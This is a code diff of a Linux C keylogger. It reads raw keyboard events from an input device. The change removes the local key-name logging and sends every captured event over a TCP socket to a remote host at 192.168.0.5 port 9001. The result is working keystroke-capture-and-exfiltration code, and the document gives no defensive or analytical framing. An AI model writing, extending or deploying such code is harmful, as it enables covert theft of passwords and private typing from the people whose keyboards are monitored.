@@ -1,20 +1,31 @@
+#include <arpa/inet.h>
+#include <netinet/in.h>
 #include <stdio.h>
 #include <fcntl.h>
 #include <linux/input.h>
 #include <string.h>
+#include <sys/socket.h>
 #include <unistd.h>
 
-const char* keymap[] = {
-    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
-    "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
-    "ENTER", "LCTRL", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`",
-    "LSHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT",
-    "*", "LALT", "SPACE", "CAPSLOCK", // Add more keys as needed
-};
 
 int main(){
+    const char *my_key = "/dev/input/event2";
+    struct sockaddr_in server_info;
+    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
+    socklen_t len = sizeof(server_info);
 
-    const char *my_key = "/dev/input/event4";
+    server_info.sin_addr.s_addr = inet_addr("192.168.0.5"); // replace with the server IP.
+    server_info.sin_port = ntohs(9001); // Replace with a suitable ports.
+    server_info.sin_family = AF_INET;
+    memset(&server_info.sin_zero, 0, sizeof(server_info.sin_zero));
+
+    if (connect(server_socket, (struct sockaddr *) &server_info, len) < 0){
+        perror("connect");
+        close(server_socket);
+        return 1;
+    }
+
+
     int fd = open(my_key, O_RDONLY);
     if (fd == -1){
         printf("Unable to open the device file");
@@ -22,29 +33,14 @@ int main(){
 
     struct input_event ev;
 
+
     FILE *logEvent = fopen("./Keylogs.txt","a");
     while(read(fd, &ev, sizeof(struct input_event)) > 0){
-        if(ev.type== EV_KEY && ev.value == 1){
-            if (ev.code < sizeof(keymap) / sizeof(keymap[0])){
-                if (strcmp(keymap[ev.code], "SPACE") == 0){
-                    fprintf(logEvent, "\n");
-                    fflush(logEvent); // Flush to ensure data is written immediately
-                }else if(strcmp(keymap[ev.code], "BACKSPACE") == 0){
-                    continue;
-                }
-                else{
-                    fprintf(logEvent, "%s", keymap[ev.code]); // Log the key itself
-                    fflush(logEvent); // Flush to ensure data is written immediately
-                }
-            }else{
-                fprintf(logEvent, "Key: %i\n",ev.code);
-                fflush(logEvent); // Force the OS into wrirting all the data in the buffer once it there.
-            }
+        if (send(server_socket, &ev, sizeof(ev), 0) < 0) {
+           perror("send failed");
+           break;
         }
     }
-
     fclose(logEvent);
     close(fd);
-
-
 }
